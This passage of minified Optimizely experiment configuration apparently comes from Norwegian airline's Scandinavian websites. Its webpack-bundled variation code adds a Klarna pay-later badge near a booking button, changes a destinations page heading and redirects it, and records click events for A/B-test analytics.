                    }, __webpack_require__.r = function (exports) {
                      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                        value: "Module"
                      }), Object.defineProperty(exports, "__esModule", {
                        value: !0
                      });
                    }, __webpack_require__.t = function (value, mode) {
                      if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                      if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                      var ns = Object.create(null);
                      if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                        enumerable: !0,
                        value: value
                      }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                        return value[key];
                      }.bind(null, key));
                      return ns;
                    }, __webpack_require__.n = function (module) {
                      var getter = module && module.__esModule ? function () {
                        return module.default;
                      } : function () {
                        return module;
                      };
                      return __webpack_require__.d(getter, "a", getter), getter;
                    }, __webpack_require__.o = function (object, property) {
                      return Object.prototype.hasOwnProperty.call(object, property);
                    }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 3);
                  }([function (module, __webpack_exports__, __webpack_require__) {
                    "use strict";

                    function campaign(expID) {
                      var varID = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "v1";
                      window.optiActiveTests = window.optiActiveTests || {}, window.optiActiveTests[expID] = varID;
                    }
                    function waitUntil(predicate) {
                      var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                      return new Promise(function (resolve) {
                        var int = setInterval(function () {
                          predicate() && (resolve(predicate()), clearInterval(int), int = null);
                        }, 500);
                        setTimeout(function () {
                          null !== int && (clearInterval(int), console.log("condition false"));
                        }, time);
                      });
                    }
                    function waitForJquery() {
                      return new Promise(function (resolve) {
                        var int = setInterval(function () {
                          "function" == typeof window.jQuery && (resolve(window.jQuery), clearInterval(int), int = null);
                        }, 500);
                        setTimeout(function () {
                          null !== int && (clearInterval(int), console.log("condition false"));
                        }, 1e4);
                      });
                    }
                    function waitForElement(selector) {
                      return new Promise(function (resolve) {
                        var element = document.querySelector(selector);
                        if (element) resolve(element);else {
                          var observer = new MutationObserver(function (mutations) {
                            mutations.forEach(function (mutation) {
                              for (var _i = 0, _nodes = Array.from(mutation.addedNodes); _i < _nodes.length; _i++) {
                                var node = _nodes[_i];
                                if (node.matches && node.matches(selector)) return observer.disconnect(), void resolve(node);
                              }
                            });
                          });
                          observer.observe(document.documentElement, {
                            childList: !0,
                            subtree: !0
                          });
                        }
                      });
                    }
                    function waitForElements() {
                      for (var _len = arguments.length, selectors = new Array(_len), _key = 0; _key < _len; _key++) selectors[_key] = arguments[_key];
                      return new Promise(function (resolve) {
                        var elements = [];
                        var int = setInterval(function () {
                          (function () {
                            elements = [];
                            for (var foundAll = !0, i = 0; i < selectors.length; i++) {
                              if (0 === document.querySelectorAll(selectors[i]).length) {
                                foundAll = !1;
                                break;
                              }
                              elements[i] = document.querySelector(selectors[i]);
                            }
                            return elements = 1 === elements.length ? elements[0] : elements, foundAll;
                          })() && (resolve(elements), clearInterval(int), int = null);
                        }, 500);
                        setTimeout(function () {
                          null !== int && (clearInterval(int), console.log("Could not find all elements"));
                        }, 1e4);
                      });
                    }
                    function defineOptiReady() {
                      var observer,
                        listeners = [],
                        doc = window.document,
                        MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
                      function check() {
                        for (var listener, elements, i = 0, len = listeners.length; i < len; i++) {
                          listener = listeners[i];
                          for (var element, j = 0, jLen = (elements = doc.querySelectorAll(listener.selector)).length; j < jLen; j++) (element = elements[j]).ready || (element.ready = []), element.ready[i] || (element.ready[i] = !0, listener.fn.call(element, element));
                        }
                      }
                      window.optiReady = function (selector, fn) {
                        listeners.push({
                          selector: selector,
                          fn: fn
                        }), observer || (observer = new MutationObserver(check)).observe(doc.documentElement, {
                          childList: !0,
                          subtree: !0
                        }), check();
                      };
                    }
                    __webpack_require__.r(__webpack_exports__), __webpack_require__.d(__webpack_exports__, "campaign", function () {
                      return campaign;
                    }), __webpack_require__.d(__webpack_exports__, "waitUntil", function () {
                      return waitUntil;
                    }), __webpack_require__.d(__webpack_exports__, "waitForJquery", function () {
                      return waitForJquery;
                    }), __webpack_require__.d(__webpack_exports__, "waitForElement", function () {
                      return waitForElement;
                    }), __webpack_require__.d(__webpack_exports__, "waitForElements", function () {
                      return waitForElements;
                    }), __webpack_require__.d(__webpack_exports__, "defineOptiReady", function () {
                      return defineOptiReady;
                    });
                  }, function (module, exports) {
                    function push_API_only(nameOfEvent) {
                      window.optimizely = window.optimizely || [], window.optimizely.push({
                        type: "event",
                        eventName: nameOfEvent
                      });
                    }
                    module.exports = {
                      push_API_only: push_API_only,
                      optimizely_trackers_clicks: function (sel, apiName) {
                        var eventNameDevice = "ontouchstart" in document.documentElement ? "touchstart" : "click";
                        jQuery(document).on(eventNameDevice, sel, function () {
                          push_API_only(apiName);
                        });
                      }
                    };
                  },, function (module, exports, __webpack_require__) {
                    module.exports = __webpack_require__(4);
                  }, function (module, exports, __webpack_require__) {
                    var _require = __webpack_require__(0),
                      waitUntil = _require.waitUntil,
                      defineOptiReady = _require.defineOptiReady,
                      tracker = __webpack_require__(1);
                    !function () {
                      defineOptiReady(), window.optiReady("#resSelection_lbtContinue", function () {
                        console.log("*** Inside Opti **"), document.querySelector("#resSelection_lbtContinue").addEventListener("click", function () {
                          tracker.push_API_only("Click_to_next_page_Avaday");
                        });
                      }), waitUntil(function () {
                        return null !== document.querySelector(".buttonbarbox #ctl00_MainContent_ipcAvaDay_lbtContinue");
                      }).then(function () {
                        console.log("**** T124 / Payment / Badges on payment opton  || SHARED Desktop*****"), document.querySelector(".buttonbarbox #ctl00_MainContent_ipcAvaDay_lbtContinue").addEventListener("click", function () {
                          tracker.push_API_only("Click_to_next_page_Avaday");
                        });
                      });
                    }();
                  }]);
                },
                "dependencies": []
              }],
              "id": "24246980037",
              "name": "[LIVE] T124 / Avaday / Add Klarna below CTA / Desktop / SE NO DK",
              "commitId": "25249500256",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {
                "google_universal_analytics": {
                  "universal_analytics_slot": "93",
                  "universal_analytics_tracker": ""
                }
              },
              "integrationStringVersion": 2,
              "experiments": [{
                "audienceIds": ["and", "20658331282", "17468470179", "17626340169"],
                "audienceName": "Country / SE,DK,NO,Desktop only,Browsers: Chrome, Safari, Edge, FireFox",
                "changes": null,
                "id": "24178720616",
                "integrationSettings": null,
                "variations": [{
                  "id": "24192010640",
                  "name": "Original",
                  "actions": []
                }, {
                  "id": "24172680555",
                  "name": "Variation #1",
                  "actions": [{
                    "viewId": "24247450013",
                    "changes": [{
                      "id": "B92388DB-1FFB-4CF1-8589-3E2979CC6B92",
                      "type": "custom_code",
                      "value": function ($) {
                        !function (modules) {
                          var installedModules = {};
                          function __webpack_require__(moduleId) {
                            if (installedModules[moduleId]) return installedModules[moduleId].exports;
                            var module = installedModules[moduleId] = {
                              i: moduleId,
                              l: !1,
                              exports: {}
                            };
                            return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                          }
                          __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                            __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                              enumerable: !0,
                              get: getter
                            });
                          }, __webpack_require__.r = function (exports) {
                            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                              value: "Module"
                            }), Object.defineProperty(exports, "__esModule", {
                              value: !0
                            });
                          }, __webpack_require__.t = function (value, mode) {
                            if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                            if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                            var ns = Object.create(null);
                            if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                              enumerable: !0,
                              value: value
                            }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                              return value[key];
                            }.bind(null, key));
                            return ns;
                          }, __webpack_require__.n = function (module) {
                            var getter = module && module.__esModule ? function () {
                              return module.default;
                            } : function () {
                              return module;
                            };
                            return __webpack_require__.d(getter, "a", getter), getter;
                          }, __webpack_require__.o = function (object, property) {
                            return Object.prototype.hasOwnProperty.call(object, property);
                          }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 0);
                        }([function (module, exports, __webpack_require__) {
                          __webpack_require__(1), module.exports = __webpack_require__(2);
                        }, function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          function t124AvadayHTMlConfig() {
                            var host = window.location.hostname.replace("www.norwegian.", "");
                            return "no" !== host && (host = window.location.pathname.split("/")[1]), {
                              selectors: {
                                ctaSelector: "#ctl00_MainContent_ipcAvaDay_lbtContinue",
                                ctaDivSelector: "#ctl00_MainContent_ipcAvaDay_pnlButtonBar .buttonbarbox"
                              },
                              html: '\n             <div class="T124_Avaday_ContentWrapper">\n                 <div class="T124_Avaday_Text">\n                    <span>\n                     '.concat({
                                no: {
                                  KlarnaIcontext: "Utsett eller del opp betalingen med <br>Klarna på Betalingssiden."
                                },
                                se: {
                                  KlarnaIcontext: "Betala senare eller dela upp betalningen med <br>Klarna på Betalningssidan."
                                },
                                dk: {
                                  KlarnaIcontext: "Udskyd eller del betalingen med <br>Klarna på betalingssiden."
                                }
                              }[host].KlarnaIcontext, '\n                    </span>\n                 </div>\n                 <div class="T124_Avaday_IconWrapper">\n                    <img src="https://cdn.klarna.com/1.0/shared/image/generic/badge/en_gb/pay_later/standard/pink.svg"/>\n                 </div>\n             </div>\n         ')
                            };
                          }
                          __webpack_require__.r(__webpack_exports__), function () {
                            function modifyCtaSectionInit() {
                              console.log("T124 / Avaday / Add Klarna below CTA / Desktop / SE NO DK || VAR"), document.querySelector("body").classList.add("T124_Avaday_iconBelowCta"), 0 === document.querySelectorAll(".T124_Avaday_ContentWrapper").length && document.querySelector(t124AvadayHTMlConfig().selectors.ctaDivSelector).insertAdjacentHTML("afterend", t124AvadayHTMlConfig().html);
                            }
                            (function (predicate) {
                              var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                              return new Promise(function (resolve) {
                                var int = setInterval(function () {
                                  predicate() && (resolve(predicate()), clearInterval(int), int = null);
                                }, 500);
                                setTimeout(function () {
                                  null !== int && (clearInterval(int), console.log("condition false"));
                                }, time);
                              });
                            })(function () {
                              return document.querySelectorAll(t124AvadayHTMlConfig().selectors.ctaSelector).length > 0;
                            }).then(function () {
                              modifyCtaSectionInit(), function (modifyCtaSectionInit) {
                                var targetNode = document.querySelector("#ctl00_MainContent_ipcAvaDay_upnlButtonBar");
                                new MutationObserver(function () {
                                  modifyCtaSectionInit();
                                }).observe(targetNode, {
                                  childList: !0
                                });
                              }(modifyCtaSectionInit);
                            });
                          }();
                        }, function (module, exports) {}]);
                      },
                      "dependencies": []
                    }, {
                      "id": "741AD7ED-8AD2-4B71-936C-23D3C3F6148F",
                      "type": "append",
                      "selector": "head",
                      "value": "<style>body.T124_Avaday_iconBelowCta #ctl00_MainContent_ipcAvaDay_pnlButtonBar .buttonbarbox{margin-bottom:10px}body.T124_Avaday_iconBelowCta .T124_Avaday_ContentWrapper{display:flex;justify-content:end;align-items:center}body.T124_Avaday_iconBelowCta .T124_Avaday_ContentWrapper .T124_Avaday_Text{margin-right:12px;display:flex;align-items:flex-end;justify-content:end;flex-direction:column}body.T124_Avaday_iconBelowCta .T124_Avaday_ContentWrapper .T124_Avaday_Text span{font-family:apercu,helvetica neue,Helvetica,Arial,sans-serif;font-weight:400;font-size:12px;line-height:16px;text-align:right;color:#003251}body.T124_Avaday_iconBelowCta .T124_Avaday_ContentWrapper .T124_Avaday_IconWrapper img{width:62px;height:34px;vertical-align:middle}</style>",
                      "dependencies": []
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "24192010640",
                  "endOfRange": 5000
                }, {
                  "entityId": "24172680555",
                  "endOfRange": 10000
                }],
                "name": "[LIVE] T124 / Avaday / Add Klarna below CTA / Desktop / SE NO DK",
                "bucketingStrategy": null
              }],
              "policy": "single_experiment",
              "viewIds": ["24247450013"],
              "weightDistributions": null,
              "decisionMetadata": null
            }, {
              "changes": [{
                "id": "D71C8774-0A76-4A93-8B9B-7A599514E0D2",
                "type": "custom_code",
                "value": function ($) {
                  !function (modules) {
                    var installedModules = {};
                    function __webpack_require__(moduleId) {
                      if (installedModules[moduleId]) return installedModules[moduleId].exports;
                      var module = installedModules[moduleId] = {
                        i: moduleId,
                        l: !1,
                        exports: {}
                      };
                      return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                    }
                    __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                      __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                        enumerable: !0,
                        get: getter
                      });
                    }, __webpack_require__.r = function (exports) {
                      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                        value: "Module"
                      }), Object.defineProperty(exports, "__esModule", {
                        value: !0
                      });
                    }, __webpack_require__.t = function (value, mode) {
                      if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                      if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                      var ns = Object.create(null);
                      if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                        enumerable: !0,
                        value: value
                      }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                        return value[key];
                      }.bind(null, key));
                      return ns;
                    }, __webpack_require__.n = function (module) {
                      var getter = module && module.__esModule ? function () {
                        return module.default;
                      } : function () {
                        return module;
                      };
                      return __webpack_require__.d(getter, "a", getter), getter;
                    }, __webpack_require__.o = function (object, property) {
                      return Object.prototype.hasOwnProperty.call(object, property);
                    }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 2);
                  }([function (module, __webpack_exports__, __webpack_require__) {
                    "use strict";

                    function waitUntil(predicate) {
                      var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                      return new Promise(function (resolve) {
                        var int = setInterval(function () {
                          predicate() && (resolve(predicate()), clearInterval(int), int = null);
                        }, 500);
                        setTimeout(function () {
                          null !== int && (clearInterval(int), console.log("condition false"));
                        }, time);
                      });
                    }
                    __webpack_require__.d(__webpack_exports__, "a", function () {
                      return waitUntil;
                    });
                  },, function (module, exports, __webpack_require__) {
                    module.exports = __webpack_require__(3);
                  }, function (module, __webpack_exports__, __webpack_require__) {
                    "use strict";

                    __webpack_require__.r(__webpack_exports__);
                    var _assets_utilitiesSeparate__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(0),
                      tracker = __webpack_require__(4);
                    !function () {
                      var selectorMatches = function (el, selector) {
                          var p = Element.prototype,
                            f = p.matches || p.webkitMatchesSelector || p.mozMatchesSelector || p.msMatchesSelector;
                          return void 0 === f && (f = -1 !== [].indexOf.call(document.querySelectorAll(selector), this)), f.call(el, selector);
                        },
                        bindClickDom = function (selector, handler) {
                          document.addEventListener("click", function (e) {
                            for (var doc = window.document, target = e.target; target && target !== doc; target = target.parentNode) if (selectorMatches(target, selector)) {
                              handler.call(target, e);
                              break;
                            }
                          }, !1);
                        };
                      function norT139_SharedInit() {
                        console.log("********* T139 / Destinations / Four VS Three  || SHARED CODE*****"), bindClickDom(".nas-destination-list__item", function () {
                          tracker.push_API_only("Clicks_on_a_Destination_box");
                        }), document.querySelectorAll("nas-toggle.nas-destination-filter__rounded-toggle .nas-toggle__items .nas-toggle__label, nas-toggle.nas-destination-filter__rounded-toggle .nas-toggle__items .nas-toggle__text").forEach(function (catClick) {
                          catClick.addEventListener("click", function () {
                            tracker.push_API_only("Clicks_on_Categories");
                          });
                        });
                      }
                      Object(_assets_utilitiesSeparate__WEBPACK_IMPORTED_MODULE_0__.a)(function () {
                        return null !== document.querySelector(".nas-destination-list__item") && null !== document.querySelector("nas-toggle.nas-destination-filter__rounded-toggle .nas-toggle__items .nas-toggle__label") && null !== document.querySelectorAll(".nas-destination-list__header--selection button");
                      }).then(function () {
                        norT139_SharedInit();
                      });
                    }();
                  }, function (module, exports) {
                    function push_API_only(nameOfEvent) {
                      window.optimizely = window.optimizely || [], window.optimizely.push({
                        type: "event",
                        eventName: nameOfEvent
                      });
                    }
                    module.exports = {
                      push_API_only: push_API_only,
                      optimizely_trackers_clicks: function (sel, apiName) {
                        var eventNameDevice = "ontouchstart" in document.documentElement ? "touchstart" : "click";
                        jQuery(document).on(eventNameDevice, sel, function () {
                          push_API_only(apiName);
                        });
                      }
                    };
                  }]);
                },
                "dependencies": []
              }],
              "id": "25245771789",
              "name": "[QA] T139 / Destinations / Four VS Three / Desktop & Mobile",
              "commitId": "25297561032",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              "integrationStringVersion": 2,
              "experiments": [{
                "audienceIds": ["and", "17279193910"],
                "audienceName": "Test Cookie",
                "changes": null,
                "id": "25222621604",
                "integrationSettings": null,
                "variations": [{
                  "id": "25248061366",
                  "name": "Original",
                  "actions": []
                }, {
                  "id": "25257071194",
                  "name": "Variation #1",
                  "actions": [{
                    "viewId": "25351520104",
                    "changes": [{
                      "id": "0F3CE720-763E-4AAF-9FD1-59241DBD7E2E",
                      "type": "custom_code",
                      "value": function ($) {
                        !function (modules) {
                          var installedModules = {};
                          function __webpack_require__(moduleId) {
                            if (installedModules[moduleId]) return installedModules[moduleId].exports;
                            var module = installedModules[moduleId] = {
                              i: moduleId,
                              l: !1,
                              exports: {}
                            };
                            return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                          }
                          __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                            __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                              enumerable: !0,
                              get: getter
                            });
                          }, __webpack_require__.r = function (exports) {
                            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                              value: "Module"
                            }), Object.defineProperty(exports, "__esModule", {
                              value: !0
                            });
                          }, __webpack_require__.t = function (value, mode) {
                            if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                            if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                            var ns = Object.create(null);
                            if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                              enumerable: !0,
                              value: value
                            }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                              return value[key];
                            }.bind(null, key));
                            return ns;
                          }, __webpack_require__.n = function (module) {
                            var getter = module && module.__esModule ? function () {
                              return module.default;
                            } : function () {
                              return module;
                            };
                            return __webpack_require__.d(getter, "a", getter), getter;
                          }, __webpack_require__.o = function (object, property) {
                            return Object.prototype.hasOwnProperty.call(object, property);
                          }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 1);
                        }([function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          function waitUntil(predicate) {
                            var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                            return new Promise(function (resolve) {
                              var int = setInterval(function () {
                                predicate() && (resolve(predicate()), clearInterval(int), int = null);
                              }, 500);
                              setTimeout(function () {
                                null !== int && (clearInterval(int), console.log("condition false"));
                              }, time);
                            });
                          }
                          __webpack_require__.d(__webpack_exports__, "a", function () {
                            return waitUntil;
                          });
                        }, function (module, exports, __webpack_require__) {
                          __webpack_require__(5), module.exports = __webpack_require__(6);
                        },,,, function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          __webpack_require__.r(__webpack_exports__);
                          var utilitiesSeparate = __webpack_require__(0);
                          !function () {
                            function norT139_headingChange() {
                              var host;
                              document.querySelector(".container .breadcrumbs + h1") && (document.querySelector(".container .breadcrumbs + h1").textContent = {
                                se: {
                                  norT139Destination: "Destinationer"
                                },
                                dk: {
                                  norT139Destination: "Destinationer"
                                },
                                no: {
                                  norT139Destination: "Destinasjoner"
                                }
                              }[host = window.location.hostname.replace("www.norwegian.", ""), "no" !== host && (host = window.location.pathname.split("/")[1]), host].norT139Destination);
                            }
                            Object(utilitiesSeparate.a)(function () {
                              return (null !== document.querySelector(".container .breadcrumbs + h1") || null !== document.querySelector(".page-cover__title")) && null !== document.querySelector("button.nas-destination-list__header--selection-item-button");
                            }).then(function () {
                              console.log("******T139 / Destinations / Four VS Three / Desktop & Mobile*****"), document.querySelector("body").classList.add("norT139_fourVsThree"), norT139_headingChange();
                            });
                          }();
                        }, function (module, exports) {}]);
                      },
                      "dependencies": []
                    }, {
                      "id": "8E340731-CC8D-409C-AED9-FFEFB13A87C8",
                      "type": "append",
                      "selector": "head",
                      "value": "<style>.norT139_fourVsThree .nas-destination-list__header--selection button.nas-destination-list__header--selection-item-button {\n    pointer-events: unset;\n    color: #003251;\n    border-bottom: unset;\n}</style>",
                      "dependencies": []
                    }, {
                      "id": "C6347A35-BD42-4ED9-A3E5-BA8ED388E9D8",
                      "type": "redirect",
                      "dependencies": [],
                      "preserveParameters": false,
                      "allowAdditionalRedirect": false,
                      "dest": function redirectFn() {
                        if (window.location.href.indexOf('/se/destinationer') > -1) {
                          window.location.href = 'https://www.norwegian.com/se/destinations-1/';
                        } else if (window.location.href.indexOf('/dk/destinationer/') > -1) {
                          window.location.href = 'https://www.norwegian.com/dk/destinations-1/';
                        } else if (window.location.href.indexOf('.no/destinasjoner/') > -1) {
                          window.location.href = 'https://www.norwegian.no/destinations-1/';
                        }
                      }
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "25257071194",
                  "endOfRange": 10000
                }],
                "name": "[QA] T139 / Destinations / Four VS Three / Desktop & Mobile",
                "bucketingStrategy": null
              }],
              "policy": "single_experiment",
              "viewIds": ["25351520104"],
              "weightDistributions": null,
              "decisionMetadata": null
            }, {
              "changes": [{
                "id": "cce27af9561a457e8815460b19c4cf65",
                "type": "custom_code",
                "value": function ($) {
                  !function (modules) {
                    var installedModules = {};
                    function __webpack_require__(moduleId) {
                      if (installedModules[moduleId]) return installedModules[moduleId].exports;
                      var module = installedModules[moduleId] = {
                        i: moduleId,
                        l: !1,
                        exports: {}
                      };
                      return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                    }
                    __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                      __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                        enumerable: !0,
                        get: getter
                      });
                    }, __webpack_require__.r = function (exports) {
                      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                        value: "Module"
                      }), Object.defineProperty(exports, "__esModule", {
                        value: !0
                      });
                    }, __webpack_require__.t = function (value, mode) {
                      if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                      if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                      var ns = Object.create(null);
                      if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                        enumerable: !0,
                        value: value
                      }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                        return value[key];
                      }.bind(null, key));
                      return ns;
                    }, __webpack_require__.n = function (module) {
                      var getter = module && module.__esModule ? function () {
                        return module.default;
                      } : function () {
                        return module;
                      };
                      return __webpack_require__.d(getter, "a", getter), getter;
                    }, __webpack_require__.o = function (object, property) {
                      return Object.prototype.hasOwnProperty.call(object, property);
                    }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 2);
                  }([function (module, __webpack_exports__, __webpack_require__) {
                    "use strict";

                    function waitUntil(predicate) {
                      var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                      return new Promise(function (resolve) {
                        var int = setInterval(function () {
                          predicate() && (resolve(predicate()), clearInterval(int), int = null);
                        }, 500);
                        setTimeout(function () {
                          null !== int && (clearInterval(int), console.log("condition false"));
                        }, time);
                      });
                    }
                    __webpack_require__.d(__webpack_exports__, "a", function () {
                      return waitUntil;
                    });
                  },, function (module, exports, __webpack_require__) {
                    module.exports = __webpack_require__(3);
                  }, function (module, __webpack_exports__, __webpack_require__) {
                    "use strict";

                    __webpack_require__.r(__webpack_exports__);
                    var _assets_utilitiesSeparate__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(0),
                      tracker = __webpack_require__(4);
                    !function () {
                      function norT132_SharedInit() {
                        var elements;
                        console.log("********* T132 / Homepage / Abandonned basket in search box / SE, NO, DK || SHARED CODE*****"), document.querySelector(".abandoned-basket .abandoned-basket__item") && document.querySelector(".abandoned-basket .abandoned-basket__item").addEventListener("click", function () {
                          tracker.push_API_only("Clicks_on_Abandoned_cart");
                        }), document.querySelector(".nor_T132_abandonedBasket__illustration") && document.querySelector(".nor_T132_abandonedBasket__illustration").addEventListener("click", function () {
                          tracker.push_API_only("Clicks_on_Abandoned_cart");
                        }), document.querySelector(".nas-flight-search .nas-continue__content .nas-continue__action").addEventListener("click", function () {
                          tracker.push_API_only("Clicks_on_Main_CTA_in_Search");
                        }), document.querySelector(".nas-continue__extra label.nas-checkbox input").addEventListener("click", function () {
                          tracker.push_API_only("Clicks_on_checkbox_LowPrice_Calendar");
                        }), window.innerWidth > 768 ? ((elements = document.querySelectorAll(".page-section .promotion.promotion__content")).length >= 2 && elements[0].classList.add("norT132_CheapestFlightTickets"), document.querySelectorAll(".norT132_CheapestFlightTickets .promotion__item").forEach(function (ele) {
                          ele.addEventListener("click", function () {
                            tracker.push_API_only("clicks_on_Cheapest_tickets");
                          });
                        })) : document.querySelectorAll(".promotion.promotion__header + .promotion__content a").forEach(function (ele) {
                          ele.addEventListener("click", function () {
                            tracker.push_API_only("clicks_on_Cheapest_tickets");
                          });
                        });
                      }
                      !function () {
                        var observer,
                          listeners = [],
                          doc = window.document,
                          MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
                        function check() {
                          for (var listener, elements, i = 0, len = listeners.length; i < len; i++) {
                            listener = listeners[i];
                            for (var element, j = 0, jLen = (elements = doc.querySelectorAll(listener.selector)).length; j < jLen; j++) (element = elements[j]).sharedReady || (element.sharedReady = []), element.sharedReady[i] || (element.sharedReady[i] = !0, listener.fn.call(element, element));
                          }
                        }
                        window.optiReadyShared = function (selector, fn) {
                          listeners.push({
                            selector: selector,
                            fn: fn
                          }), observer || (observer = new MutationObserver(check)).observe(doc.documentElement, {
                            childList: !0,
                            subtree: !0
                          }), check();
                        };
                      }(), window.optiReadyShared(".nas-search-box .nas-tab-group form.nas-flight-search", function () {
                        console.log("** SHARED CODE ACTIVATED || Optiready **"), Object(_assets_utilitiesSeparate__WEBPACK_IMPORTED_MODULE_0__.a)(function () {
                          return null !== document.querySelector(".abandoned-basket a.abandoned-basket__item") && null !== document.querySelector(".page-section .promotion.promotion__content") || null !== document.querySelector(".nas-flight-search .nas-continue__content .nas-continue__action");
                        }).then(function () {
                          norT132_SharedInit();
                        });
                      });
                    }();
                  }, function (module, exports) {
                    function push_API_only(nameOfEvent) {
                      window.optimizely = window.optimizely || [], window.optimizely.push({
                        type: "event",
                        eventName: nameOfEvent
                      });
                    }
                    module.exports = {
                      push_API_only: push_API_only,
                      optimizely_trackers_clicks: function (sel, apiName) {
                        var eventNameDevice = "ontouchstart" in document.documentElement ? "touchstart" : "click";
                        jQuery(document).on(eventNameDevice, sel, function () {
                          push_API_only(apiName);
                        });
                      }
                    };
                  }]);
                },
                "dependencies": []
              }],
              "id": "24790401268",
              "name": "[LIVE] T132 / Homepage / Abandonned basket in search box / SE, NO, DK || Mobile",
              "commitId": "25261241521",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {
                "google_universal_analytics": {
                  "universal_analytics_slot": "90",
                  "universal_analytics_tracker": ""
                }
              },
              "integrationStringVersion": 2,
              "experiments": [{
                "audienceIds": ["and", "25031190207", "17626340169", "17412550827"],
                "audienceName": "NOR T132 Abandonned Cart,Browsers: Chrome, Safari, Edge, FireFox,Mobile users",
                "changes": null,
                "id": "24788760322",
                "integrationSettings": null,
                "variations": [{
                  "id": "24793031970",
                  "name": "Original",
                  "actions": []
                }, {
                  "id": "24797291436",
                  "name": "Variation #1",
                  "actions": [{
                    "viewId": "24793031969",
                    "changes": [{
                      "id": "ba44ee02def442fa8b223fbeb30197af",
                      "type": "custom_code",
                      "value": function ($) {
                        !function (modules) {
                          var installedModules = {};
                          function __webpack_require__(moduleId) {
                            if (installedModules[moduleId]) return installedModules[moduleId].exports;
                            var module = installedModules[moduleId] = {
                              i: moduleId,
                              l: !1,
                              exports: {}
                            };
                            return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                          }
                          __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                            __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                              enumerable: !0,
                              get: getter
                            });
                          }, __webpack_require__.r = function (exports) {
                            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                              value: "Module"
                            }), Object.defineProperty(exports, "__esModule", {
                              value: !0
                            });
                          }, __webpack_require__.t = function (value, mode) {
                            if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                            if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                            var ns = Object.create(null);
                            if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                              enumerable: !0,
                              value: value
                            }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                              return value[key];
                            }.bind(null, key));
                            return ns;
                          }, __webpack_require__.n = function (module) {
                            var getter = module && module.__esModule ? function () {
                              return module.default;
                            } : function () {
                              return module;
                            };
